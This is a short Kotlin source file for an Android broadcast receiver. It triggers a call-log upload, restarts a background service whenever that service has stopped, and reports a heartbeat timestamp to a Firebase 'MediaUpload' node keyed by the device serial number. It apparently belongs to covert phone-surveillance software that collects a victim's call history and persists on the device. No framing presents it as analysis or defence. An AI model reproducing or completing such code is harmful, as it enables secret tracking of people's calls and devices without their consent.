package com.developer.service

import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.google.firebase.database.FirebaseDatabase

class BroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {


        if (intent.action == "Call")
            Call().uploadCallLog(context)


        if (!isMyServiceRunning(context, Service::class.java))
            context.startService(Intent(context, Service::class.java))

        lastFire()

    }

    private fun isMyServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
        val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        return manager.getRunningServices(Integer.MAX_VALUE).any { serviceClass.name == it.service.className }
    }

    private fun lastFire() {
        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("LastFire")
        myRef.setValue(System.currentTimeMillis())
    }

}